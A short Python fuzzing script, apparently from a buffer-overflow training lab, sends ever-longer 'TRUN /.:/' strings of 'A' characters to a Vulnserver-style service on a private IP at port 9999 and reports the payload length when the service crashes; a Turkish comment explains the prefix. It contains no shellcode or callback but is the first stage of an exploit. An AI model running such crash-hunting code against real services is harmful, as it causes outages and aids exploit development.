import socket
from time import sleep
import sys
numberOfCharacters=100
stringToSend="TRUN /.:/" + "A" * numberOfCharacters #Sistemin algılaması için /.:/ yapılması gerekir ve burada 100 tane a  gönder diyoruz

while True:
    try:
        baglanti=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        baglanti.connect(("192.168.1.107",9999))
        byte=stringToSend.encode(encoding="latin1")
        baglanti.send(byte)
        baglanti.close()
        
        stringToSend=stringToSend+ "A" * numberOfCharacters
        sleep(1)
    except KeyboardInterrupt as e:
        print("Crash at:"+str(len(stringToSend)))
        print(e)
        sys.exit()
    except Exception as e:
        print("Crash at:"+str(len(stringToSend)))
        print(e)
        sys.exit()
    
